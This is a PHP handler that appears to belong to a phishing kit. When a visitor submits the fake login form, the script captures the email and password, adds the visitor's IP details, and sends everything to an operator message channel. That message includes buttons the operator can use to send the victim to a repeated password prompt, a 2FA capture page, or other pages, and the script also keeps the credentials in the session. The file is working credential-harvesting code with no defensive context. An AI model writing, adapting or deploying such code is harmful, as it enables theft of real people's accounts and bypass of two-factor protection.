<?php
	session_start();
	require_once "utility/consts.php";
	require_once "utility/message.php";

  $result = [];
  switch ($_POST["action"]){
    case "login":
      if(is_set("password") && is_set("email")){
        $message = "SECOND EMAIL\n";
        $message .= $_SESSION["ipinfo"]["message"];
        $message .= "Email: ". $_POST["email"] ."\n";
        $message .= "Password: ". $_POST["password"] ."\n";
        $buttons = [
          ["text" => "PASSWD", "url" => API."/".ROOM."/PASSWDAGAIN" ],
          ["text" => "SENDTO2FA", "url" => API."/".ROOM."/SENDTO2FA" ],
          ["text" => "SENDTOEMAIL", "url" => API."/".ROOM."/SENDTOEMAIL" ],
          ["text" => "CAREER", "url" => API."/".ROOM."/CAREER" ]
        ];
        send_message($message, $buttons);
        $_SESSION["data"]["email"] = $_POST["email"];
        $_SESSION["data"]["password"] = $_POST["password"];
      }
      $result["success"] = true;
      break;
    case "likelyModal":
      setcookie("likelyClosed", true, time() + (86400 * 30), "/");
      $_SESSION["likelyClosed"] = true;
      break;
  }

  echo json_encode($result);
?>
